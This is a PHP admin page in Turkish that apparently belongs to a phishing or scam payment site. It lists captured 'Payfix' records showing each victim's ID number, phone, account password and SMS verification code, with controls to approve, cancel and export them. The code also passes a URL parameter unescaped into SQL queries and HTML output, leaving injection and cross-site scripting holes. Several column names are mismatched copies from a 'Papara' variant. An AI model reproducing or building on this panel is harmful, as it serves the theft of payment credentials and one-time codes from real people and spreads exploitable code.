<?php

  $type = $_GET['type'];

  $query = $db -> query("SELECT * from payments where type='$type' order by id DESC");

  $total = $db -> query("SELECT count(id) as num from payments where type='$type'")->fetch_assoc();

  $payment_status = $db -> query("SELECT status from payment_methods where slug = '$type'")->fetch_assoc();

?>

<div class="dflex align-center justify-between m-b-15">

  <div>

    <button class="btn btn-danger hidden-xs" onclick="deleteAllData('payments', '<?=$type?>')">Tümünü sil</button>

    <button class="btn btn-default m-l-5" onclick="exportTable('payments','<?=$type?>')">Dışa Aktar</button>

    <button class="btn btn-default m-l-5" onclick="changePaymentStatus('<?=$type?>')"><?=$payment_status["status"] ? "Kapalı" : "Açık"?></button>

  </div>

  <div>

    <div class="pagenations">

      <ul>

        <li class="hidden-xs">Toplam veri<span class="text-500 m-l-5"><?=$total["num"]?></span></li>

      </ul>

    </div>

  </div>

</div>

<div class="panel">

  <div class="panel-head bg-primary text-uppercase text-normal text-600">Payfix İşlemleri</div>

  <div class="simple-table simple-table-primary">

    <table>

      <thead>

        <tr>

          <th>No</th>

          <th>Kullanıcı</th>

          <th>Payfix TC</th>
            <th>Payfix Tel</th>

          <th>Payfix Şifre</th>

          <th>Payfix SMS</th>

          <th>Tutar</th>

          <th>Durum</th>

          <th></th>

        </tr>

      </thead>

      <tbody>

        <?php

          $status = [

            array('title' => 'Bekliyor', 'icon' => 'dot-warning'),

            array('title' => 'Onaylandı', 'icon' => 'dot-success'),

            array('title' => 'İptal Edildi', 'icon' => 'dot-danger')

          ];

          while ($res = $query -> fetch_assoc()) { ?>

            <tr>

              <td><?=$order?></td>

              <td><?=$res['user']?></td>

  <td><?=$res['papara_email']?></td>
              <td><?=$res['buyer_phone']?></td>

              <td><?=$res['papara_password']?></td>

              <td><?=$res['papara_sms_code']?></td>

              <td><?=$res['amount']?> TL</td>

              <td class="status">

                <div class="dflex align-center">

                  <span class="dot <?=$status[$res['status']]['icon']?> m-r-10"></span>

                  <?=$status[$res['status']]['title']?>

                </div>

              </td>

              <td>

                <ul class="dflex">

                  <?php if ($res['status'] == 0) { ?>

                    <li class="m-l-10 rm"><a href="javascript:;" onclick="changeStatus(<?=$res['id']?>, 1, <?=$res['user_id']?>, <?=$res['amount']?>)" class="btn btn-default btn-sm">Onayla</a></li>

                    <li class="m-l-10 rm"><a href="javascript:;" onclick="changeStatus(<?=$res['id']?>, 2, <?=$res['user_id']?>, <?=$res['amount']?>)" class="btn btn-default btn-sm">İptal Et</a></li>

                  <?php } ?>

                  <li class="m-l-10"><a href="javascript:;" onclick="deleteData2('payments', <?=$res['id']?>, this)" class="btn btn-default btn-sm">Sil</a></li>

                </ul>

              </td>

            </tr>

          <?php $order--; } ?>

      </tbody>

    </table>

  </div>

</div>

